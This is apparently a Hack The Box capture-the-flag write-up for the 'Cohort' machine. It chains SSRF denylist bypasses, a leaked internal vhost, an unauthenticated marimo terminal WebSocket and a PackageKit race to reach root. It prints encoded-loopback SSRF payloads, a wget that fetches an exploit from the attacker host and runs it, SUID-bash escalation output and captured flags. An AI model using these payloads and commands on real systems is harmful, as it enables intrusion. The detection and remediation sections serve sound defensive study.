<div align="center">

# 🎯 HTB: Cohort, The Box That Encrypted Nothing

**"I came for the flags. I stayed because nmap said `filtered` and now it's personal."**

![Status](https://img.shields.io/badge/status-rooted-brightgreen)
![Difficulty](https://img.shields.io/badge/difficulty-medium%2Fhard-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Chain](https://img.shields.io/badge/chain-SSRF_to_root-purple)
![Vibe](https://img.shields.io/badge/vibe-corporate_dystopia-lightgrey)

</div>

---

## ☕ A Quick Word Before We Start

Cohort wants you to believe it's a serious analytics company. It has a dashboard, a wildcard cert, and an "encrypted" JS bundle, all the trappings of a startup that raised a Series A on a slide that said "AI-powered insights." What it actually has is an SSRF endpoint that trusts user input the way a golden retriever trusts a stranger with a tennis ball, and a client-side encryption scheme that ships its own key in the same file as the ciphertext. That's not encryption. That's gift-wrapping a present and taping the receipt to the box.

Grab your coffee. This one's a five-stage chain, and every stage is the same joke told a different way: something on this server trusted a string when it should have trusted a resolved, verified value. Let's go find out who wrote the blocklist and have a word with them.

---

## ⚡ TL;DR

1. **SSRF** in `/api/validate`. The blocklist checks for the literal text `127.0.0.1`, so `2130706433` (same address, decimal flavor) strolls right past security like it's wearing a lanyard.
2. **Internal port scan via SSRF** finds a Flask API on `5000` and an unauthenticated marimo notebook on `8888`, both hiding behind "loopback only," which is corporate for "please don't look here."
3. **`/status` leak** (SSRF makes the request look local) hands over the internal vhost `nb-<hash>.cohort.htb`, proxying straight to that notebook.
4. **CVE-2026-39987**: marimo's login page is decorative. The `/terminal/ws` WebSocket has zero auth. Walk right in, shell as `marimo`.
5. **CVE-2026-41651 ("Pack2TheRoot")**: a TOCTOU race in PackageKit lets two D-Bus calls race each other to root, and root loses the race on purpose.

Five bugs, one root cause, repeated with different costumes: **the server kept checking the string instead of the thing the string was supposed to represent.**

---

## 📋 Machine Info

| Field          | Value                                          |
| -------------- | ----------------------------------------------- |
| **Target IP**  | `10.129.98.178`                                  |
| **Hostnames**  | `cohort.htb`, `nb-1be3782a8afd3ad5.cohort.htb`   |
| **OS**         | Linux (Ubuntu)                                   |
| **Difficulty** | Medium/Hard                                      |
| **Status**     | ✅ Rooted                                        |

---

## 📑 Table of Contents

1. [Enumeration](#1-enumeration)
2. [Web Recon: The API That Says Hello](#2-web-recon-the-api-that-says-hello)
3. [Breaking AES-GCM: The Loader Was a Loader](#3-breaking-aes-gcm-the-loader-was-a-loader)
4. [SSRF in `/api/validate`: The Guard Is a String Check](#4-ssrf-in-apivalidate-the-guard-is-a-string-check)
5. [Internal Port Discovery & the Vhost Leak](#5-internal-port-discovery--the-vhost-leak)
6. [Foothold: marimo's Unauthenticated Terminal WebSocket](#6-foothold-marimos-unauthenticated-terminal-websocket)
7. [User Flag](#7-user-flag)
8. [Privilege Escalation: Pack2TheRoot](#8-privilege-escalation-pack2theroot)
9. [Root Flag](#9-root-flag)
10. [Full Attack Chain](#10-full-attack-chain)
11. [Detection Opportunities](#11-detection-opportunities)
12. [Remediation](#12-remediation)
13. [Lessons Learned](#13-lessons-learned)
14. [Tools Used](#14-tools-used)
15. [Meme Corner](#15-meme-corner)

---

# 1. Enumeration

## 🔎 Port Scan

```text
22     SSH      OpenSSH 9.6p1 Ubuntu
80     HTTP     nginx 1.24.0, redirects to HTTPS
443    HTTPS    nginx 1.24.0, cert for cohort.htb + *.cohort.htb
50001  filtered unknown
```

Port 50001 sat there the whole engagement, filtered, silent, judging me for not running `ffuf` sooner. It never mattered. It was a red herring wearing a "top secret" sticker.

The real story is the wildcard cert. `*.cohort.htb` is a developer standing in the parking lot yelling "there are more subdomains, I'm just not going to tell you which ones." Cool. Thanks. We heard you.

## 🌐 Hosts File & Reachability

```bash
echo "10.129.98.178 cohort.htb" | sudo tee -a /etc/hosts
ping -c 4 10.129.98.178
```

10% packet loss on the ping. Either network jitter, or the box already sensed what was coming and was bracing for it.

## 🔧 Service & Script Scan

```bash
sudo nmap -sC -sV -p 22,80,443 -oN nmap/services_web.txt cohort.htb
```

- **22/tcp**: OpenSSH 9.6p1 Ubuntu 3ubuntu13.18. New enough to not be embarrassing. Not the way in.
- **80/tcp**: nginx, hard 301 to HTTPS. Good hygiene, mildly annoying hygiene.
- **443/tcp**: nginx, wildcard cert, page titled "Cohort Analytics." Sounds like a company that pivoted from "AI for HR" to "dashboards nobody opens."

**Takeaway:** a wildcard cert covers every hostname under the domain, so on its own it proves nothing about what exists, only that the server was built expecting more than one name. That's still a reason to go fuzz vhosts once the front door stops being interesting.

---

# 2. Web Recon: The API That Says Hello

## 🔍 Fingerprinting

```bash
whatweb https://cohort.htb
curl -k -I https://cohort.htb
```

`200 OK`, `nginx/1.24.0 (Ubuntu)`, title "Cohort Analytics." The landing page is a 908-byte SPA shell whose entire personality is loading `/assets/app.js` and hoping for the best.

## 🧨 Directory Brute Force

```bash
feroxbuster -u https://cohort.htb -k \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -o web/ferox_https.txt
```

```text
301  GET  https://cohort.htb/api      => https://cohort.htb/api/
301  GET  https://cohort.htb/assets   => https://cohort.htb/assets/
403  GET  https://cohort.htb/status
200  GET  https://cohort.htb/api/health
```

`/api/health` says `{"ok": true, "service": "cohort-insights"}`, which is more optimism than I've had all week. `/status` is a flat 403 on every method, not even a courtesy "go away." Keep that one in your pocket, it comes back to haunt the box later.

## 🕵️ API Enumeration

```bash
feroxbuster -u https://cohort.htb/api -k \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -o web/ferox_api.txt
```

```text
200  GET  https://cohort.htb/api/api/v1/health
200  GET  https://cohort.htb/api/api/v2/health
```

The real API base is `/api/api/v1/`. Somebody nested `/api` inside `/api`, a Russian doll of a routing mistake. Probing the usual suspects (`/insights`, `/cohorts`, `/users`, `/login`):

```text
GET               → 405 {"ok": false, "message": "Method not allowed."}
POST (empty body) → 404 {"ok": false, "message": "Not found."}
PUT/DELETE/OPTIONS → 501, raw Python http.server error page
```

That raw 501 page is the tell. This is a thin Python stdlib server, not a battle-hardened framework, which means fewer default protections standing between us and whatever's next.

---

# 3. Breaking AES-GCM: The Loader Was a Loader

`/assets/app.js` deobfuscates to a 32-line AES-GCM "loader" that ships the key, the IV, and the ciphertext all in the same file, like locking your front door and leaving the key taped to it with a sticky note that says "for emergencies."

```js
var _0x16829b = "NnB02s8+X30K3WtHOjWy4qXJ2F2ihnnSImL6X4GRyZQ="; // AES key
var _0xd4dcec = "fSc+LTJkAMJgRJbQ";                             // IV
var _0x5189ce = "<43 KB of base64>";                            // ciphertext

window.crypto.subtle.importKey("raw", atob(_0x16829b), {name:"AES-GCM"}, false, ["decrypt"])
  .then(k => window.crypto.subtle.decrypt(
      {name:"AES-GCM", iv: atob(_0xd4dcec)}, k, atob(_0x5189ce)))
  .then(buf => (0, eval)(new TextDecoder().decode(buf)))
  .catch(() => {});
```

Decrypting offline, no browser theatrics required:

```js
const fs = require('fs');
const crypto = require('crypto');

const src = fs.readFileSync('web/deobf/deobfuscated.js', 'utf8');
const keyB64 = src.match(/_0x16829b\s*=\s*"([^"]+)"/)[1];
const ivB64  = src.match(/_0xd4dcec\s*=\s*"([^"]+)"/)[1];
const ctB64  = src.match(/_0x5189ce\s*=\s*"([^"]+)"/)[1];

const key = Buffer.from(keyB64, 'base64');
const iv  = Buffer.from(ivB64,  'base64');
const ct  = Buffer.from(ctB64,  'base64');

// WebCrypto's AES-GCM output is ciphertext + a 16-byte tag, glued together.
// Node wants them split apart.
const tag  = ct.subarray(ct.length - 16);
const data = ct.subarray(0, ct.length - 16);

const d = crypto.createDecipheriv('aes-256-gcm', key, iv);
d.setAuthTag(tag);
console.log(Buffer.concat([d.update(data), d.final()]).toString('utf8'));
```

Out pops the real SPA, 212 lines, confirmed with a very satisfying `wc -l`.

**Why this "encryption" protects nothing:** AES-GCM is supposed to keep a secret from someone who doesn't have the key. Here the key rides along in the exact same HTTP response as the ciphertext, delivered to the exact same untrusted browser. Nobody crossed a trust boundary, nobody needed to break any crypto. This is a runtime decompressor wearing a trench coat and pretending to be a security feature. If you ever spot `eval(decrypt(...))` with the key sitting right next to it, that's not encryption, that's a magic trick where the magician also hands you the instructions.

The decrypted portal reveals the endpoint that actually matters:

```js
fetch("/api/validate", {
  method: "POST",
  headers: { "Content-Type": "application/json", "Accept": "application/json" },
  body: JSON.stringify({ url: url, format: document.getElementById("format").value })
})
```

The server fetches a user-supplied URL server-side and hands back what it saw:

```json
{ "ok": true, "fetched_status": 200, "content_type": "...", "preview": "<first bytes of body>" }
```

That's SSRF with response reflection, which is basically the server offering to be our personal scanner. How polite.

---

# 4. SSRF in `/api/validate`: The Guard Is a String Check

The form's help text says, and I quote with love, *"For security, internal and loopback addresses are rejected."* Thanks for the confirmation and the challenge, in one sentence. That phrasing also tells us the check happens on the raw string, not after resolving it, or it would say "resolved addresses" instead of just "addresses."

## What works and what doesn't

| Payload                        | Result                                                 |
| ------------------------------- | ------------------------------------------------------ |
| `http://127.0.0.1/`             | ❌ "Internal or loopback addresses are not permitted." |
| `http://localhost/`             | ❌ blocked                                              |
| `http://[::1]/`                 | ❌ blocked                                              |
| `file:///etc/passwd`            | ❌ "Only http and https sources are supported."        |
| `http://2130706433/` (decimal)  | ✅ 200 OK, local nginx page, wearing a fake mustache   |
| `http://0177.0.0.1/` (octal)    | ✅ 200 OK                                               |
| `http://0x7f.0.0.1/` (hex)      | ✅ 200 OK                                               |
| `http://0/`                     | ✅ 200 OK                                               |
| `http://127.0.0.1.nip.io/`      | ✅ 200 OK, DNS rebinding, the classic                   |
| `http://127.1/`                 | ⚠️ 504, guard passes, backend fetch just times out     |
| `http://localhost./`            | ⚠️ 504, trailing dot fools the string match too        |

**Conclusion:** the "security" here is a literal string comparison against a tiny denylist (`127.0.0.1`, `localhost`, `::1`), checked before anything gets parsed or resolved. Decimal, octal, hex, a trailing dot, or a public hostname that happens to resolve to loopback, all of them are the same address wearing a different outfit, and the bouncer only recognizes one outfit.

**Takeaway for defenders:** validate the value your socket actually connects to, after DNS resolution, in canonical form. A denylist of literal strings is always going to lose to the infinite ways of spelling the same IP address.

## Confirming outbound egress works

```bash
# Attacker
python3 -m http.server 8000

# Victim, via the SSRF endpoint
curl -k -s https://cohort.htb/api/validate -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.10.14.184:8000/","format":"csv"}'
```

Server log on the attacker box:

```text
10.129.98.178 - - [13/Sep/2026 20:53:47] "GET / HTTP/1.1" 200 -
```

The target called us first. No client did that on our behalf, the server just decided to. That's the "F" in SSRF earning its keep.

---

# 5. Internal Port Discovery & the Vhost Leak

`preview` in the response is a beautiful, unintentional port oracle. Open ports return their real response body. Closed ones return `[Errno 111] Connection refused`, the internet's most polite way of saying "nobody's home."

Sweeping the decimal-loopback alias (`2130706433`) across common ports:

| Port | Result       | Service                          |
| ---- | ------------ | --------------------------------- |
| 22   | UNKNOWN      | non-HTTP, preview is binary soup |
| 80   | OPEN, 200    | nginx site                        |
| 443  | OPEN, 400    | nginx rejecting plain HTTP on the TLS port |
| 5000 | OPEN, 405    | the `/api` backend itself         |
| 8888 | OPEN, 200    | mystery HTML, plot twist incoming |
| *(other)* | REFUSED | nobody's home, as established     |

Port 5000 confirms where `/api` lives. Port 8888 is the interesting one, and it's about to introduce itself properly.

## `/status` leaks nginx's upstream map

`/status` said 403 to the whole outside world back in section 2, sulking behind an IP check. But a request made through the SSRF endpoint originates from loopback, and loopback gets treated like family:

```json
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[
  {"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
  {"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
  {"name":"notebooks",
   "host":"nb-1be3782a8afd3ad5.cohort.htb",
   "target":"127.0.0.1:8888",
   "note":"internal analyst workspace, not for external use"}
]}
```

That third upstream is the whole box, in one JSON blob. A marimo notebook, meant to stay internal, is proxied under `nb-1be3782a8afd3ad5.cohort.htb`, a hostname nobody would ever guess unless the server just handed it over on a silver platter. Which it did. The wildcard cert already covers it, and nginx routes purely by `Host` header, no extra permission required.

```bash
echo "10.129.98.178 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

The "internal-only" workspace is now reachable from the public internet, no SSRF needed for the rest of the trip. We've been upgraded from tourist to resident.

**The pattern here:** the 403 on `/status` was an IP-based access control, not authentication. SSRF didn't need to defeat a login, it just needed to make the request *look like it came from somewhere trusted*, which is the oldest trick in the book and still works because the book never gets old.

---

# 6. Foothold: marimo's Unauthenticated Terminal WebSocket

marimo 0.20.4 here is sitting on **CVE-2026-39987**: the login page genuinely gates the HTML UI, but the WebSocket terminal endpoint, `/terminal/ws`, checks nobody's credentials at all. The login form is a decoy. A very convincing decoy, with a password field and everything, guarding a door that has no lock on the side entrance.

```bash
which websocat || sudo apt install -y websocat

websocat -k -t wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

Straight into a PTY as the `marimo` user, no handshake beyond the WebSocket handshake itself:

```bash
marimo@cohort:~$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

No password, no cookie, no CSRF token, nothing. We just knocked and the door was already open.

---

# 7. User Flag

```bash
marimo@cohort:~$ cat user.txt
e9d55efe1864d7c0db71fddb47645040
```

One down. Root's up next, and root does not go quietly.

---

# 8. Privilege Escalation: Pack2TheRoot

`systemctl list-units` shows `packagekit.service` sitting there, inactive, D-Bus activated on demand, like a sleeper agent waiting for a wake-up call. This version falls inside the range hit by **CVE-2026-41651**, a TOCTOU race in PackageKit's transaction handling (1.0.2 through 1.3.4).

## Root cause

Three bugs in `src/pk-transaction.c`, stacked like a bad Jenga tower:

1. `InstallFiles()` overwrites cached transaction flags and paths unconditionally, no state check first.
2. `pk_transaction_set_state()` silently drops backward state transitions instead of rejecting them.
3. `pk_transaction_run()` reads the cached flags at dispatch time, not at the moment authorization was actually checked.

Set the `SIMULATE` flag and PackageKit skips the polkit prompt entirely, since simulating an install shouldn't need permission. Fine in isolation. Then fire two async D-Bus calls back to back: `InstallFiles(SIMULATE, dummy)` immediately followed by `InstallFiles(NONE, malicious_payload)`. Both land before the GLib idle callback that would normally re-check state gets a chance to run. The second call quietly inherits the first call's already-approved simulated state, and a real, non-simulated install of an attacker's package proceeds as root. The house always wins, except this time the house is us.

## Exploitation

No compiler on the target, so the exploit gets built locally and shipped over:

```bash
# Local machine
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
sudo apt install -y libglib2.0-dev build-essential
gcc src/cve-2026-41651.c -o cve-2026-41651 \
  $(pkg-config --cflags --libs glib-2.0 gio-2.0 gobject-2.0)
python3 -m http.server 9002
```

```bash
# Via the marimo WebSocket shell
cd /tmp/exploit
wget http://10.10.14.184:9002/cve-2026-41651 -O cve-2026-41651
chmod +x cve-2026-41651
./cve-2026-41651
```

Output:

```text
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[!] PK error 48: Failed to obtain authentication.   <- expected, harmless
[+] SUCCESS, SUID bash at t+1300ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash-5.2#
```

That "PK error 48" line looks like failure. It's not. By the time polkit gets around to rejecting the second call, the malicious `.deb`'s `postinst` script (`chmod +s /bin/bash`) has already run as root, race won, prize collected. `euid=0` is all that matters here, the kernel checks effective UID, not the real one, and ours just went from a nobody to a somebody.

---

# 9. Root Flag

```bash
root@cohort:~# cat /root/root.txt
770434bf575733fc15efd3f40efd7122
```

Rooted. The box has been gently, professionally, and thoroughly humbled.

---

# 10. Full Attack Chain

```text
Unauthenticated SSRF in /api/validate
        |
        v
Blocklist bypass, 2130706433 instead of 127.0.0.1
        |
        v
Internal port scan via SSRF -> Flask API (5000) + marimo notebook (8888, loopback-only)
        |
        v
/status leak (SSRF bypasses the IP-based 403) -> reveals internal vhost
        |
        v
nb-<hash>.cohort.htb added to /etc/hosts -> marimo now reachable over public nginx/443
        |
        v
CVE-2026-39987, unauthenticated /terminal/ws -> shell as marimo
        |
        v
CVE-2026-41651 (Pack2TheRoot), PackageKit TOCTOU race -> root
```

Five bugs. One personality trait shared between all of them: something here trusted a string instead of checking the resolved, verified thing behind it. An IP as text. A source address treated as a permission slip. An auth check that covered one door but not the window next to it. A cached flag read after it should have been double-checked. Same joke, five punchlines.

---

# 11. Detection Opportunities

Because every offensive writeup owes the blue team a little something:

- **Outbound connections from the web app to non-application IPs** (like our `10.10.14.184`) coming from the `/api/validate` process. An egress allowlist, or just alerting on a host that should only ever talk to its own database suddenly talking to the internet, catches this at the exact moment it's used.
- **Requests to `/status` where the source looks like loopback but the URL parameter decodes to something else entirely.** Logging the decoded destination next to the raw request would have caught the encoding trick immediately.
- **WebSocket connections to `/terminal/ws` with no prior authenticated HTTP session.** Correlate the WS handshake with the HTTP session and this foothold never happens.
- **D-Bus `InstallFiles` calls fired by a non-privileged UID milliseconds apart.** That's not how anyone installs a package by hand. PackageKit transaction logs would show the race attempt plainly.

---

# 12. Remediation

| Issue                         | Fix                                                                                          |
| ------------------------------ | ---------------------------------------------------------------------------------------------- |
| SSRF in `/api/validate`        | Allowlist permitted destinations. Validate the resolved IP after DNS lookup, not the input string. Reject non-canonical IP encodings outright. |
| Internal `/status` endpoint    | Shouldn't be reachable from the app server's network path at all. Bind it to a genuinely internal interface, not just an IP check on the public one. |
| marimo pre-auth RCE            | Upgrade to marimo ≥ 0.23.0. Authenticate every endpoint that grants shell access, WebSockets included, not just the HTML routes. |
| PackageKit TOCTOU              | Upgrade to PackageKit ≥ 1.3.5.                                                                |
| General                        | Least privilege. The `marimo` account had no business being able to trigger privileged D-Bus/PackageKit transactions in the first place. |

---

# 13. Lessons Learned

- A blocklist that string-matches `127.0.0.1` is not an SSRF protection, it's a participation trophy.
- Client-side "encryption" with the key shipped next to the ciphertext protects nothing. It's a magic trick where the audience is also the magician.
- A "403 internal only" page can still answer differently once a request arrives from a trusted network position. SSRF is very good at manufacturing trust it never earned.
- Auth checks need to cover every entrance to a capability, not just the one with a doorbell. A login page means nothing if the WebSocket behind it skips the guest list.
- Wildcard certs are a defender's convenience and an attacker's treasure map. They confirm more doors exist without saying where, which is exactly the invitation to go knock on all of them.

---

# 14. Tools Used

`nmap` · `feroxbuster` · `ffuf` · `whatweb` · `curl` · `websocat` · `webcrack` · Node.js (AES-GCM decryption) · `python3` (HTTP servers, port sweeping) · `git` + `gcc` (local exploit compilation)

---

# 15. Meme Corner

> "It's not a vulnerability, it's a feature with root access."

> Cohort Analytics: turning your data into insights, and your loopback filter into a suggestion.

> The AES key was hardcoded right next to the ciphertext. Somewhere, a cryptographer felt a disturbance, like a thousand key rotations crying out at once.

<div align="center">

---

🔐 **Cohort, Rooted.**
HTB · Linux · Born as root, died as root, we just borrowed it for a bit.

</div>
